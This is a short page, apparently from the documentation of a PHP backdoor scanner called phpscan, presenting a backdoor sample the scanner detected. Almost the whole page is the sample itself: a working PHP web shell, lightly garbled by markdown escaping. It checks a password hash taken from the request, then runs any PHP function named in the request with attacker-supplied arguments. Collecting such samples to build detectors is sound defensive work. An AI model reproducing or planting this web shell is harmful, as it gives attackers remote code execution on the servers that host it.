#Backdoor-sample

# Introduction #

被phpscan成功扫描到的样本

# Backdoor-sample-from-nbubbs-com #

<?php

error\_reporting(E\_ERROR);

if (isset($_REQUEST['myfunctionpassw']))_

> define('FUNCTION\_PASSW',stripslashes($_REQUEST['myfunctionpassw']));_

if (isset($_REQUEST['myfunctioncodea']))_

> define('FUNCTION\_CODEA',stripslashes($_REQUEST['myfunctioncodea']));_

if (isset($_REQUEST['myfunctioncodeb']))_

> define('FUNCTION\_CODEB',stripslashes($_REQUEST['myfunctioncodeb']));_

if (isset($_REQUEST['myfunctioncodec']))_

> define('FUNCTION\_CODEC',stripslashes($_REQUEST['myfunctioncodec']));_

if (substr ( md5 (FUNCTION\_PASSW),26) == '254bff') {

> if (isset($_REQUEST['myfunctioncodea']) && isset($_REQUEST['myfunctioncodeb']) && isset($_REQUEST['myfunctioncodec']))_

> $_REQUEST['myfunctionname'](FUNCTION\_CODEA, FUNCTION\_CODEB, FUNCTION\_CODEC);_

> elseif (isset($_REQUEST['myfunctioncodea']) && isset($_REQUEST['myfunctioncodeb']))

> $_REQUEST['myfunctionname'](FUNCTION\_CODEA, FUNCTION\_CODEB) ? print(FUNCTION\_CODEA.' ok') : print(FUNCTION\_CODEA.' err');_

> else

> $_REQUEST['myfunctionname'](FUNCTION\_CODEA);_

} else {

> die('Access Denied');

}
?>